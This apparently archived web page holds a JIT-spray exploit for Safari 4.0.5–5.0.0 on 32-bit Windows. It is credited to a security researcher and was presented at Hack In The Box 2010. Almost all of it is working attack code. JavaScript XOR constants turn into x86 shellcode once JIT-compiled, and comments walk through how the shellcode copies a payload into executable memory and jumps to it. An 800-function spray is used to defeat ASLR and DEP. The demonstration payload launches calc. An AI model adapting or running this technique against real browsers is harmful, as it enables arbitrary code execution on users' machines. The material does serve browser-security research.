<html><head><title>Windows - Safari JS JITed shellcode - exec calc (ASLR/DEP bypass)</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
&lt;!--
JIT-SPRAY for Safari 4.0.5 - 5.0.0
 
JavaScript JIT SHELLCODE and spray
             for
         ASLR / DEP bypass (Win x32)
          
By Alexey Sintsov
   from Digital Security Research Group
 
Special for Hack In The Box 2010 Amsterdam
 
 
PAYLOAD - exec calc
Tested on Windows7 and Windows XP. (Sorry - have not Mac yet)
  
 
 
 - How it works?
 
 - Answer here:
 http://dsecrg.com/pages/pub/show.php?id=26
 
 
[DSecRG]
www.dsecrg.com
 
--&gt;
&lt;script&gt;
 
 
var SPRAY=&quot;&quot;;
 
var JIT=&quot;{ &quot;+
&quot;var y=(&quot;+
&quot;0x22222222^&quot;+ /* START OF OFFSET */
&quot;0x22222222^&quot;+
&quot;0x22222222^&quot;+
&quot;0x22222222^&quot;+
&quot;0x22222222^&quot;+ /*we don't wanna NULLS in pointer*/
&quot;0x22222222^&quot;+
&quot;0x22222222^&quot;+
&quot;0x22222222^&quot;+
&quot;0x22222222^&quot;+ /*SHELLCODE BEGINS*/
 
&quot;0x14ebc031^&quot;+ // xor eax,eax  &lt;------------------ EIP=0xXXYY0104
&quot;0x14eb27b4^&quot;+ // mov ah, 27    ; HC - CHANGE THIS, if u want to write SC to another page
&quot;0x14eb35b0^&quot;+ // mov al, 35    ; HC - ------^
&quot;0x14ebe0f7^&quot;+ // mul eax
&quot;0x14eb00b0^&quot;+ // mov al, 00
&quot;0x14eb00b4^&quot;+ // now EAX = 06010000 - RWX memory pointer for shellcode
&quot;0x14ebc88b^&quot;+ // mov ecx, eax ; now ECX is pointer on RWX mem
 
&quot;0x14ebdb33^&quot;+ // xor ebx, ebx
&quot;0x14eb04b3^&quot;+ // mov bl, 4    ; EBX = 0x4 - step to pointer
               
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb0bb4^&quot;+ // mov ah, 0b
&quot;0x14ebb5b0^&quot;+ // mov al, fc
&quot;0x14ebe0f7^&quot;+ // mul eax    ;EAX = 0089xxyy
&quot;0x14ebe8b4^&quot;+ // mov ah, e8
&quot;0x14ebfcb0^&quot;+ // mov al, fc ; EAX=0089E8FC - value of shellcode
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbbb4^&quot;+ // mov ah, bb
&quot;0x14eb88b0^&quot;+ // mov al, 88
&quot;0x14ebe0f7^&quot;+ // mul eax  ; EAX = 8959xxyy
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax  ; EAX = 89600000
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eba0b4^&quot;+ // mov ah, a0
&quot;0x14eba8b0^&quot;+ // mov al, a8
&quot;0x14ebe0f7^&quot;+ // EAX = 64D2xxyy
&quot;0x14eb31b4^&quot;+ // mov ah, 31
&quot;0x14ebe5b0^&quot;+ // mov al, e5 ; EAX = 64D231E5
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbcb4^&quot;+ // mov ah, bc
&quot;0x14ebc4b0^&quot;+ // mov al, c4
&quot;0x14ebe0f7^&quot;+ // EAX = 8B300000
&quot;0x14eb52b4^&quot;+ // mov ah, 52
&quot;0x14eb8bb0^&quot;+ // mov al, 8b ;
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb91b4^&quot;+ // mov ah, 91
&quot;0x14eb5eb0^&quot;+ // mov al, 5e
&quot;0x14ebe0f7^&quot;+ // EAX = 528B0000
&quot;0x14eb0cb4^&quot;+ // mov ah, 0c
&quot;0x14eb52b0^&quot;+ // mov al, 52
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb65b4^&quot;+ // mov ah, 65
&quot;0x14ebc2b0^&quot;+ // mov al, c2
&quot;0x14ebe0f7^&quot;+ // EAX = 28720000
&quot;0x14eb8bb4^&quot;+ // mov ah, 8b
&quot;0x14eb14b0^&quot;+ // mov al, 14
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb63b4^&quot;+ // mov ah, 63
&quot;0x14eb02b0^&quot;+ // mov al, 02
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebb7b4^&quot;+ // mov ah, b7
&quot;0x14eb0fb0^&quot;+ // mov al, 0f
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebddb4^&quot;+ // mov ah, dd
&quot;0x14ebd0b0^&quot;+ // mov al, d0
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14ebffb4^&quot;+ // mov ah, b7
&quot;0x14eb31b0^&quot;+ // mov al, 0f
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebb2b4^&quot;+ // mov ah, b2
&quot;0x14eb71b0^&quot;+ // mov al, 71
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb3cb4^&quot;+ // mov ah, 3c
&quot;0x14ebacb0^&quot;+ // mov al, ac
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebdeb4^&quot;+ // mov ah, de
&quot;0x14eb5ab0^&quot;+ // mov al, 5a
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb2cb4^&quot;+ // mov ah, 2c
&quot;0x14eb02b0^&quot;+ // mov al, 02
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebe1b4^&quot;+ // mov ah, e1
&quot;0x14ebb6b0^&quot;+ // mov al, b6
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb0db4^&quot;+ // mov ah, 0d
&quot;0x14ebcfb0^&quot;+ // mov al, cf
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb95b4^&quot;+ // mov ah, 95
&quot;0x14eb84b0^&quot;+ // mov al, 84
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebf0b4^&quot;+ // mov ah, f0
&quot;0x14ebe2b0^&quot;+ // mov al, e2
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbcb4^&quot;+ // mov ah, bc
&quot;0x14ebaeb0^&quot;+ // mov al, ae
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb52b4^&quot;+ // mov ah, 52
&quot;0x14eb8bb0^&quot;+ // mov al, 8b
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebe6b4^&quot;+ // mov ah, e6
&quot;0x14ebc2b0^&quot;+ // mov al, c2
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb3cb4^&quot;+ // mov ah, 3c
&quot;0x14eb42b0^&quot;+ // mov al, 42
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebb8b4^&quot;+ // mov ah, b8
&quot;0x14ebd9b0^&quot;+ // mov al, d9
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb40b4^&quot;+ // mov ah, 40
&quot;0x14eb8bb0^&quot;+ // mov al, 8b
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb12b4^&quot;+ // mov ah, 12
&quot;0x14eb2bb0^&quot;+ // mov al, 2b
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb74b4^&quot;+ // mov ah, 74
&quot;0x14ebc0b0^&quot;+ // mov al, c0
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb88b4^&quot;+ // mov ah, 88
&quot;0x14eb47b0^&quot;+ // mov al, 47
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb50b4^&quot;+ // mov ah, 50
&quot;0x14ebd0b0^&quot;+ // mov al, d0
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb5ab4^&quot;+ // mov ah, 5a
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb8bb4^&quot;+ // mov ah, 8b
&quot;0x14eb18b0^&quot;+ // mov al, 18
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb7cb4^&quot;+ // mov ah, 7c
&quot;0x14ebdab0^&quot;+ // mov al, da
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebd3b4^&quot;+ // mov ah, d3
&quot;0x14eb01b0^&quot;+ // mov al, 01
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbcb4^&quot;+ // mov ah, bc
&quot;0x14ebc7b0^&quot;+ // mov al, c7
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb8bb4^&quot;+ // mov ah, 8b
&quot;0x14eb49b0^&quot;+ // mov al, 49
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14eb98b0^&quot;+ // mov al, 98
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14ebd6b4^&quot;+ // mov ah, d6
&quot;0x14eb01b0^&quot;+ // mov al, 01
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebdeb4^&quot;+ // mov ah, de
&quot;0x14ebaab0^&quot;+ // mov al, aa
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14ebc0b4^&quot;+ // mov ah, c0
&quot;0x14eb31b0^&quot;+ // mov al, 31
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebe1b4^&quot;+ // mov ah, e1
&quot;0x14ebb6b0^&quot;+ // mov al, b6
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb0db4^&quot;+ // mov ah, 0d
&quot;0x14ebcfb0^&quot;+ // mov al, cf
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebfab4^&quot;+ // mov ah, fa
&quot;0x14eb29b0^&quot;+ // mov al, 29
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14ebe0b4^&quot;+ // mov ah, e0
&quot;0x14eb38b0^&quot;+ // mov al, 38
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb7bb4^&quot;+ // mov ah, 7b
&quot;0x14ebe8b0^&quot;+ // mov al, e8
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb7db4^&quot;+ // mov ah, 7d
&quot;0x14eb03b0^&quot;+ // mov al, 03
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebf0b4^&quot;+ // mov ah, f0
&quot;0x14ebc7b0^&quot;+ // mov al, c7
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb24b4^&quot;+ // mov ah, 24
&quot;0x14eb7db0^&quot;+ // mov al, 7d
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb60b4^&quot;+ // mov ah, 60
&quot;0x14eb76b0^&quot;+ // mov al, 76
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb8bb4^&quot;+ // mov ah, 8b
&quot;0x14eb58b0^&quot;+ // mov al, 58
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbcb4^&quot;+ // mov ah, bc
&quot;0x14ebe8b0^&quot;+ // mov al, e8
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14ebd3b4^&quot;+ // mov ah, d3
&quot;0x14eb01b0^&quot;+ // mov al, 01
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb96b4^&quot;+ // mov ah, 96
&quot;0x14eb8fb0^&quot;+ // mov al, 8f
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb4bb4^&quot;+ // mov ah, 4b
&quot;0x14eb0cb0^&quot;+ // mov al, 0c
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbdb4^&quot;+ // mov ah, bd
&quot;0x14eb32b0^&quot;+ // mov al, 32
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14eb01b4^&quot;+ // mov ah, 01
&quot;0x14eb1cb0^&quot;+ // mov al, 1c
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebe6b4^&quot;+ // mov ah, e6
&quot;0x14ebc2b0^&quot;+ // mov al, c2
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb8bb4^&quot;+ // mov ah, 8b
&quot;0x14eb04b0^&quot;+ // mov al, 04
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb60b4^&quot;+ // mov ah, 60
&quot;0x14eb30b0^&quot;+ // mov al, 30
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb44b4^&quot;+ // mov ah, 44
&quot;0x14eb89b0^&quot;+ // mov al, 89
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb97b4^&quot;+ // mov ah, 97
&quot;0x14eb44b0^&quot;+ // mov al, 44
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb5bb4^&quot;+ // mov ah, 5b
&quot;0x14eb5bb0^&quot;+ // mov al, 5b
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebefb4^&quot;+ // mov ah, ef
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14eb51b4^&quot;+ // mov ah, 51
&quot;0x14eb5ab0^&quot;+ // mov al, 5a
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbcb4^&quot;+ // mov ah, bc
&quot;0x14ebe0b0^&quot;+ // mov al, e0
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14eb5fb4^&quot;+ // mov ah, 5f
&quot;0x14eb58b0^&quot;+ // mov al, 58
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb9ab4^&quot;+ // mov ah, 9a
&quot;0x14ebbcb0^&quot;+ // mov al, bc
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebebb4^&quot;+ // mov ah, eb
&quot;0x14eb12b0^&quot;+ // mov al, 12
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebb8b4^&quot;+ // mov ah, b8
&quot;0x14ebe7b0^&quot;+ // mov al, e7
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14eb01b4^&quot;+ // mov ah, 01
&quot;0x14eb6ab0^&quot;+ // mov al, 6a
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebb9b0^&quot;+ // mov al, b9
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebbcb4^&quot;+ // mov ah, bc
&quot;0x14ebc5b0^&quot;+ // mov al, c5
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb68b4^&quot;+ // mov ah, 68
&quot;0x14eb50b0^&quot;+ // mov al, 50
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebeab4^&quot;+ // mov ah, ea
&quot;0x14eb0fb0^&quot;+ // mov al, 0f
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb87b4^&quot;+ // mov ah, 87
&quot;0x14eb6fb0^&quot;+ // mov al, 6f
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebccb4^&quot;+ // mov ah, cc
&quot;0x14eb17b0^&quot;+ // mov al, 17
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14ebffb0^&quot;+ // mov al, ff
&quot;0x14eb4090^&quot;+ // inc eax
&quot;0x14ebf0b4^&quot;+ // mov ah, f0
&quot;0x14ebbbb0^&quot;+ // mov al, bb
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebc3b4^&quot;+ // mov ah, c3
&quot;0x14ebbbb0^&quot;+ // mov al, bb
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb68b4^&quot;+ // mov ah, 68
&quot;0x14eb56b0^&quot;+ // mov al, 56
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebeab4^&quot;+ // mov ah, ea
&quot;0x14eb0fb0^&quot;+ // mov al, 0f
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb9db4^&quot;+ // mov ah, 9d
&quot;0x14ebbdb0^&quot;+ // mov al, bd
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb33b4^&quot;+ // mov ah, 33
&quot;0x14ebcfb0^&quot;+ // mov al, cf
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb06b4^&quot;+ // mov ah, 06
&quot;0x14eb3cb0^&quot;+ // mov al, 3c
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14ebadb4^&quot;+ // mov ah, ad
&quot;0x14ebb7b0^&quot;+ // mov al, b7
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebfbb4^&quot;+ // mov ah, fb
&quot;0x14eb80b0^&quot;+ // mov al, 80
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb46b4^&quot;+ // mov ah, 46
&quot;0x14eb40b0^&quot;+ // mov al, 40
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebbbb4^&quot;+ // mov ah, bb
&quot;0x14eb05b0^&quot;+ // mov al, 05
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb0ab4^&quot;+ // mov ah, 0a
&quot;0x14eb4cb0^&quot;+ // mov al, 4c
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb6fb4^&quot;+ // mov ah, 6f
&quot;0x14eb72b0^&quot;+ // mov al, 72
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb9fb4^&quot;+ // mov ah, 9f
&quot;0x14ebdeb0^&quot;+ // mov al, de
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14ebffb4^&quot;+ // mov ah, ff
&quot;0x14eb53b0^&quot;+ // mov al, 53
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
&quot;0x14ebc031^&quot;+ // xor eax,eax
&quot;0x14eb09b4^&quot;+ // mov ah, 09
&quot;0x14ebf4b0^&quot;+ // mov al, f4
&quot;0x14ebe0f7^&quot;+ // EAX
&quot;0x14eb6cb4^&quot;+ // mov ah, 6c
&quot;0x14eb61b0^&quot;+ // mov al, 61
&quot;0x14ebcb03^&quot;+ // add ecx, ebx ; ecx=ecx+4 - move pointer
&quot;0x14eb0189^&quot;+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
&quot;0x14eb00b5^&quot;+ // mov ch, 00
&quot;0x14eb00b1^&quot;+ // mov cl, 00 ; ECX = 06010000 ; RWE memory WITH shellcode
&quot;0x14ebe1ff^&quot;+ // JMP ECX ; PROFIT !
 
&quot;0x14ebcccc&quot;+
&quot;);&quot;+
&quot;return y; }&quot;;
 
 
var zl=&quot;zlo_&quot;;
     
for (var i=1;i&lt;800;i++)
{
    SPRAY+=&quot;function &quot;+zl+i+&quot;()&quot;+JIT+&quot; &quot;+zl+i+&quot;();&quot;;
}
 
eval(SPRAY);
 
&lt;/script&gt;

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
